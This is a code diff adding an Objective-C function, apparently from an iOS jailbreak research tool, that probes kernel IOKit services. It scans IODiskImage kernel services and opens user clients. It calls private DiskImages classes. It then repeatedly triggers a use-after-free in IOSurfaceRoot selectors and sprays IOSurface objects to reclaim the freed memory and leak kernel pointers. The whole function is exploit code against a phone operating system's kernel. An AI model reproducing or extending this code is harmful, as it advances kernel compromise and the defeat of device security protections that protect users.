@@ -44649,3 +44649,370 @@ void iosurface_direct_attach(ISRLogBlock log, ISRDoneBlock done) {
         done(results);
     });
 }
+
+void iosurface_kernel_ptrleak(ISRLogBlock log, ISRDoneBlock done) {
+    dispatch_async(dispatch_get_global_queue(0, 0), ^{
+        log(@"JB63: === Kernel Pointer Leak via UAF + IODiskImage Deep ===");
+        NSMutableDictionary *results = [NSMutableDictionary dictionary];
+        results[@"probe"] = @"JB63";
+
+        typedef void*(*matching_fn)(const char*);
+        typedef unsigned int(*getmatch_fn)(unsigned int, void*);
+        typedef int(*getmatches_fn)(unsigned int, void*, unsigned int*);
+        typedef int(*svcopen_fn)(unsigned int, unsigned int, unsigned int, unsigned int*);
+        typedef int(*svcclose_fn)(unsigned int);
+        typedef int(*callmethod_fn)(unsigned int, uint32_t, const uint64_t*, uint32_t, const void*, size_t, uint64_t*, uint32_t*, void*, size_t*);
+        typedef int(*callasync_fn)(unsigned int, uint32_t, unsigned int, uint64_t*, uint32_t, const uint64_t*, uint32_t, const void*, size_t, void*, uint32_t*, uint64_t*, uint32_t*);
+        typedef unsigned int(*iteratornext_fn)(unsigned int);
+        typedef int(*objrelease_fn)(unsigned int);
+        typedef int(*regentryid_fn)(unsigned int, uint64_t*);
+        typedef int(*regcreate_fn)(unsigned int, void**, void*, unsigned int);
+        typedef unsigned int(*allocport_fn)(void);
+
+        matching_fn sym_matching = (matching_fn)dlsym(RTLD_DEFAULT, "IOServiceMatching");
+        getmatch_fn sym_getmatch = (getmatch_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingService");
+        getmatches_fn sym_getmatches = (getmatches_fn)dlsym(RTLD_DEFAULT, "IOServiceGetMatchingServices");
+        svcopen_fn sym_open = (svcopen_fn)dlsym(RTLD_DEFAULT, "IOServiceOpen");
+        svcclose_fn sym_close = (svcclose_fn)dlsym(RTLD_DEFAULT, "IOServiceClose");
+        callmethod_fn sym_call = (callmethod_fn)dlsym(RTLD_DEFAULT, "IOConnectCallMethod");
+        callasync_fn sym_async = (callasync_fn)dlsym(RTLD_DEFAULT, "IOConnectCallAsyncMethod");
+        iteratornext_fn sym_next = (iteratornext_fn)dlsym(RTLD_DEFAULT, "IOIteratorNext");
+        objrelease_fn sym_release = (objrelease_fn)dlsym(RTLD_DEFAULT, "IOObjectRelease");
+        regentryid_fn sym_regid = (regentryid_fn)dlsym(RTLD_DEFAULT, "IORegistryEntryGetRegistryEntryID");
+        regcreate_fn sym_regcreate = (regcreate_fn)dlsym(RTLD_DEFAULT, "IORegistryEntryCreateCFProperties");
+        allocport_fn sym_allocport = (allocport_fn)dlsym(RTLD_DEFAULT, "IONotificationPortCreate");
+
+        id(*msg)(id, SEL, ...) = (id(*)(id, SEL, ...))dlsym(RTLD_DEFAULT, "objc_msgSend");
+
+        if (!sym_matching || !sym_getmatch || !sym_open || !sym_close || !sym_call || !sym_async || !sym_regid || !sym_regcreate) {
+            log(@"JB63: FAIL — dlsym missing IOKit symbols");
+            results[@"verdict"] = @"DLSYM_FAIL";
+            done(results);
+            return;
+        }
+
+        const uint32_t SEL_REG = 17;
+        const uint32_t SEL_DEREG = 18;
+
+        // AA1: Find IODiskImageBlockStorageDeviceInKernel services
+        log(@"JB63: --- AA1: IODiskImageBlockStorageDeviceInKernel deep scan ---");
+        int aa1_found = 0;
+        uint64_t diskimg_regid = 0;
+        {
+            unsigned int iter = 0;
+            void *match = sym_matching("IODiskImageBlockStorageDeviceInKernel");
+            if (match && sym_getmatches) {
+                int kr = sym_getmatches(0, match, &iter);
+                if (kr == 0 && iter) {
+                    unsigned int svc;
+                    while ((svc = sym_next(iter)) != 0) {
+                        aa1_found++;
+                        uint64_t rid = 0;
+                        sym_regid(svc, &rid);
+                        log([NSString stringWithFormat:@"JB63: AA1 svc=%u regEntryID=0x%llx", svc, rid]);
+                        if (diskimg_regid == 0) diskimg_regid = rid;
+
+                        void *props = NULL;
+                        int pkr = sym_regcreate(svc, &props, NULL, 0);
+                        if (pkr == 0 && props) {
+                            NSDictionary *d = (__bridge_transfer NSDictionary *)props;
+                            log([NSString stringWithFormat:@"JB63: AA1 props=%lu keys: %@", (unsigned long)d.count, d.allKeys]);
+                        } else {
+                            log([NSString stringWithFormat:@"JB63: AA1 props kr=0x%x", pkr]);
+                        }
+
+                        int openOk = 0;
+                        for (unsigned int t = 0; t <= 5; t++) {
+                            unsigned int c = 0;
+                            int okr = sym_open(svc, mach_task_self(), t, &c);
+                            if (okr == 0) {
+                                openOk++;
+                                log([NSString stringWithFormat:@"JB63: AA1 type=%u OPEN conn=%u", t, c]);
+                                sym_close(c);
+                            }
+                        }
+                        log([NSString stringWithFormat:@"JB63: AA1 openOk=%d/6", openOk]);
+                        sym_release(svc);
+                    }
+                    sym_release(iter);
+                }
+            }
+            if (aa1_found == 0) {
+                match = sym_matching("IODiskImageBlockStorageDeviceInKernel");
+                if (match) {
+                    unsigned int svc = sym_getmatch(0, match);
+                    if (svc) {
+                        aa1_found = 1;
+                        sym_regid(svc, &diskimg_regid);
+                        log([NSString stringWithFormat:@"JB63: AA1 single svc=%u regEntryID=0x%llx", svc, diskimg_regid]);
+                        sym_release(svc);
+                    }
+                }
+            }
+            log([NSString stringWithFormat:@"JB63: AA1 found=%d diskimg_regid=0x%llx", aa1_found, diskimg_regid]);
+        }
+        results[@"aa1_found"] = @(aa1_found);
+        results[@"aa1_regid"] = [NSString stringWithFormat:@"0x%llx", diskimg_regid];
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // AA2: DIDeviceHandle with IODiskImage regEntryID
+        log(@"JB63: --- AA2: DIDeviceHandle with diskimg regEntryID ---");
+        int aa2_ok = 0;
+        {
+            dlopen("/System/Library/PrivateFrameworks/DiskImages.framework/DiskImages", RTLD_NOW);
+            dlopen("/System/Library/PrivateFrameworks/DiskImages2.framework/DiskImages2", RTLD_NOW);
+            Class dhClass = NSClassFromString(@"DIDeviceHandle");
+            if (dhClass && diskimg_regid != 0) {
+                @try {
+                    SEL initSel = sel_registerName("initWithRegEntryID:");
+                    id handle = ((id(*)(id, SEL, uint64_t))msg)([dhClass alloc], initSel, diskimg_regid);
+                    if (handle) {
+                        aa2_ok = 1;
+                        SEL bsdSel = sel_registerName("BSDName");
+                        SEL xpcSel = sel_registerName("xpcEndpoint");
+                        SEL c2ioSel = sel_registerName("client2IOhandler");
+                        SEL regSel = sel_registerName("regEntryID");
+                        SEL hrcSel = sel_registerName("handleRefCount");
+                        id bsd = msg(handle, bsdSel);
+                        id xpc = msg(handle, xpcSel);
+                        id c2io = msg(handle, c2ioSel);
+                        uint64_t regV = ((uint64_t(*)(id, SEL))msg)(handle, regSel);
+                        int64_t hrc = ((int64_t(*)(id, SEL))msg)(handle, hrcSel);
+                        log([NSString stringWithFormat:@"JB63: AA2 handle OK bsd=%@ xpc=%@ c2io=%@ regID=0x%llx hrc=%lld", bsd, xpc, c2io, regV, hrc]);
+
+                        Class c2ioClass = object_getClass(c2io);
+                        log([NSString stringWithFormat:@"JB63: AA2 c2io class=%@", c2ioClass ? NSStringFromClass(c2ioClass) : @"nil"]);
+
+                        SEL addRefSel = sel_registerName("addToRefCountWithError:");
+                        NSError *err = nil;
+                        @try {
+                            ((void(*)(id, SEL, NSError**))msg)(handle, addRefSel, &err);
+                            log([NSString stringWithFormat:@"JB63: AA2 addToRefCount err=%@", err]);
+                        } @catch (NSException *ex) {
+                            log([NSString stringWithFormat:@"JB63: AA2 addToRefCount exc: %@", ex.reason]);
+                        }
+                    } else {
+                        log(@"JB63: AA2 handle=nil — init failed for diskimg regEntryID");
+                    }
+                } @catch (NSException *ex) {
+                    log([NSString stringWithFormat:@"JB63: AA2 exception: %@", ex.reason]);
+                }
+            } else {
+                log([NSString stringWithFormat:@"JB63: AA2 skip — dhClass=%@ diskimg_regid=0x%llx", dhClass ? @"OK" : @"nil", diskimg_regid]);
+            }
+        }
+        results[@"aa2_ok"] = @(aa2_ok);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // AA3: UAF immediate stale read — raw dup values
+        log(@"JB63: --- AA3: UAF immediate stale read (raw dup) ---");
+        int aa3_kptr = 0;
+        {
+            void *surfMatch = sym_matching("IOSurfaceRoot");
+            unsigned int surfSvc = surfMatch ? sym_getmatch(0, surfMatch) : 0;
+            unsigned int conn = 0;
+            int openKr = surfSvc ? sym_open(surfSvc, mach_task_self(), 0, &conn) : -1;
+            if (surfSvc) sym_release(surfSvc);
+
+            unsigned int wp = 0;
+            if (sym_allocport) wp = sym_allocport(0);
+
+            if (openKr == 0) {
+                NSDictionary *surfProps = @{
+                    @"IOSurfaceAllocSize": @4096,
+                    @"IOSurfaceWidth": @32,
+                    @"IOSurfaceHeight": @32,
+                    @"IOSurfaceBytesPerRow": @128,
+                    @"IOSurfacePixelFormat": @0x42475241
+                };
+
+                typedef void*(*cfcreate_fn)(void*);
+                cfcreate_fn sym_sc = (cfcreate_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+                void *surfObj = sym_sc ? sym_sc((__bridge void *)surfProps) : NULL;
+
+                uint64_t in[3] = {0, 0, 0};
+                int bestShape = 1;
+
+                log([NSString stringWithFormat:@"JB63: AA3 conn=%u wp=%u surfObj=%p", conn, wp, surfObj]);
+
+                for (int trial = 0; trial < 10; trial++) {
+                    int r1 = jb41_callSel(conn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                    int r2 = jb41_callSel(conn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+                    int dup = jb41_callSel(conn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                    int r4 = jb41_callSel(conn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+                    log([NSString stringWithFormat:@"JB63: AA3 t%d reg=%d dereg=%d dup=0x%x dereg2=%d", trial, r1, r2, (unsigned)dup, r4]);
+
+                    if (dup != 0 && dup != (int)0xC9 && dup != (int)0xe00002c2) {
+                        aa3_kptr++;
+                        log([NSString stringWithFormat:@"JB63: AA3 UNUSUAL dup=0x%x — potential kernel data", (unsigned)dup]);
+                    }
+                }
+
+                if (surfObj) {
+                    typedef void(*cfrel_fn)(void*);
+                    cfrel_fn sym_cfrelease = (cfrel_fn)dlsym(RTLD_DEFAULT, "CFRelease");
+                    if (sym_cfrelease) sym_cfrelease(surfObj);
+                }
+                sym_close(conn);
+            } else {
+                log([NSString stringWithFormat:@"JB63: AA3 open failed kr=0x%x", openKr]);
+            }
+        }
+        results[@"aa3_kptr"] = @(aa3_kptr);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // AA4: UAF + IOSurface property spray for kernel pointer leak
+        log(@"JB63: --- AA4: UAF + property spray reclaim ---");
+        int aa4_kptr = 0;
+        {
+            void *surfMatch = sym_matching("IOSurfaceRoot");
+            unsigned int surfSvc = surfMatch ? sym_getmatch(0, surfMatch) : 0;
+            unsigned int conn = 0;
+            int openKr = surfSvc ? sym_open(surfSvc, mach_task_self(), 0, &conn) : -1;
+            if (surfSvc) sym_release(surfSvc);
+
+            unsigned int wp = 0;
+            if (sym_allocport) wp = sym_allocport(0);
+
+            if (openKr == 0) {
+                typedef void*(*cfcreate_fn)(void*);
+                cfcreate_fn sym_sc = (cfcreate_fn)dlsym(RTLD_DEFAULT, "IOSurfaceCreate");
+                typedef void(*cfrel_fn)(void*);
+                cfrel_fn sym_cfrelease = (cfrel_fn)dlsym(RTLD_DEFAULT, "CFRelease");
+
+                NSDictionary *baseProps = @{
+                    @"IOSurfaceAllocSize": @4096,
+                    @"IOSurfaceWidth": @32,
+                    @"IOSurfaceHeight": @32,
+                    @"IOSurfaceBytesPerRow": @128,
+                    @"IOSurfacePixelFormat": @0x42475241
+                };
+                void *baseSurf = sym_sc ? sym_sc((__bridge void *)baseProps) : NULL;
+
+                uint64_t in[3] = {0, 0, 0};
+                int bestShape = 1;
+
+                for (int trial = 0; trial < 5; trial++) {
+                    int r1 = jb41_callSel(conn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                    int r2 = jb41_callSel(conn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+                    void *sprayRefs[32];
+                    int sprayed = 0;
+                    for (int s = 0; s < 32; s++) {
+                        NSDictionary *sp = @{
+                            @"IOSurfaceAllocSize": @(4096 + s),
+                            @"IOSurfaceWidth": @(32 + s),
+                            @"IOSurfaceHeight": @32,
+                            @"IOSurfaceBytesPerRow": @128,
+                            @"IOSurfacePixelFormat": @0x42475241
+                        };
+                        void *ref = sym_sc ? sym_sc((__bridge void *)sp) : NULL;
+                        if (ref) { sprayRefs[sprayed++] = ref; }
+                    }
+
+                    int dup = jb41_callSel(conn, SEL_REG, in, 24, bestShape, wp, sym_call, sym_async);
+                    jb41_callSel(conn, SEL_DEREG, in, 24, 0, wp, sym_call, sym_async);
+
+                    log([NSString stringWithFormat:@"JB63: AA4 t%d reg=%d dereg=%d sprayed=%d dup=0x%x", trial, r1, r2, sprayed, (unsigned)dup]);
+
+                    if (dup != 0 && dup != (int)0xC9 && dup != (int)0xe00002c2) {
+                        aa4_kptr++;
+                        log([NSString stringWithFormat:@"JB63: AA4 UNUSUAL dup=0x%x — may be kernel ptr", (unsigned)dup]);
+                    }
+
+                    for (int s = 0; s < sprayed; s++) {
+                        if (sym_cfrelease) sym_cfrelease(sprayRefs[s]);
+                    }
+                }
+
+                if (baseSurf && sym_cfrelease) sym_cfrelease(baseSurf);
+                sym_close(conn);
+            }
+        }
+        results[@"aa4_kptr"] = @(aa4_kptr);
+
+        if (isr_stopped()) { results[@"verdict"] = @"STOPPED"; done(results); return; }
+
+        // AA5: DIIOMedia deep inspection
+        log(@"JB63: --- AA5: DIIOMedia deep disk inspection ---");
+        int aa5_ok = 0;
+        {
+            Class ioClass = NSClassFromString(@"DIIOMedia");
+            if (ioClass) {
+                NSArray *diskNames = @[@"disk0", @"disk1", @"disk2", @"disk3", @"disk4", @"disk0s1", @"disk0s2"];
+                for (NSString *name in diskNames) {
+                    @try {
+                        SEL initSel = sel_registerName("initWithDevName:error:");
+                        NSError *err = nil;
+                        id media = ((id(*)(id, SEL, id, NSError**))msg)([ioClass alloc], initSel, name, &err);
+                        if (media) {
+                            aa5_ok++;
+                            SEL bsdSel = sel_registerName("BSDName");
+                            id bsd = msg(media, bsdSel);
+
+                            SEL bdSel = sel_registerName("copyBlockDeviceWithError:");
+                            NSError *err2 = nil;
+                            id bd = ((id(*)(id, SEL, NSError**))msg)(media, bdSel, &err2);
+                            NSString *bdClass = bd ? NSStringFromClass(object_getClass(bd)) : @"nil";
+
+                            log([NSString stringWithFormat:@"JB63: AA5 %@ media=OK bsd=%@ blockDev=%@ err=%@", name, bsd, bdClass, err2]);
+
+                            if (bd) {
+                                SEL diskImgDevSel = sel_registerName("diskImageDevice");
+                                @try {
+                                    id dev = msg(bd, diskImgDevSel);
+                                    log([NSString stringWithFormat:@"JB63: AA5 %@ diskImageDevice=%@", name, dev]);
+                                } @catch (NSException *ex) {
+                                    log([NSString stringWithFormat:@"JB63: AA5 %@ diskImageDevice exc: %@", name, ex.reason]);
+                                }
+
+                                SEL medTypeSel = sel_registerName("mediumType");
+                                @try {
+                                    id mt = msg(bd, medTypeSel);
+                                    log([NSString stringWithFormat:@"JB63: AA5 %@ mediumType=%@", name, mt]);
+                                } @catch (NSException *ex) { }
+
+                                SEL rootBDSel = sel_registerName("copyRootBlockDeviceWithError:");
+                                @try {
+                                    NSError *re = nil;
+                                    id rootBD = ((id(*)(id, SEL, NSError**))msg)(bd, rootBDSel, &re);
+                                    NSString *rootClass = rootBD ? NSStringFromClass(object_getClass(rootBD)) : @"nil";
+                                    log([NSString stringWithFormat:@"JB63: AA5 %@ rootBlockDev=%@ err=%@", name, rootClass, re]);
+                                } @catch (NSException *ex) {
+                                    log([NSString stringWithFormat:@"JB63: AA5 %@ rootBlockDev exc: %@", name, ex.reason]);
+                                }
+                            }
+                        } else {
+                            if (err) {
+                                log([NSString stringWithFormat:@"JB63: AA5 %@ FAIL err=%@", name, err.localizedDescription]);
+                            }
+                        }
+                    } @catch (NSException *ex) {
+                        log([NSString stringWithFormat:@"JB63: AA5 %@ exception: %@", name, ex.reason]);
+                    }
+                }
+            } else {
+                log(@"JB63: AA5 DIIOMedia class not found");
+            }
+        }
+        results[@"aa5_ok"] = @(aa5_ok);
+
+        // Verdict
+        NSString *verdict = @"NO_LEAK";
+        if (aa3_kptr > 0 || aa4_kptr > 0) {
+            verdict = [NSString stringWithFormat:@"KPTR_FOUND_%d_%d", aa3_kptr, aa4_kptr];
+        } else if (aa2_ok) {
+            verdict = @"DISKIMG_HANDLE_OK";
+        } else if (aa5_ok > 0) {
+            verdict = [NSString stringWithFormat:@"IOMEDIA_%d", aa5_ok];
+        }
+        results[@"verdict"] = verdict;
+        log([NSString stringWithFormat:@"JB63: Verdict: %@", verdict]);
+        isr_checkpoint(@"JB63-kernel-ptrleak-checkpoint.json", results);
+        done(results);
+    });
+}
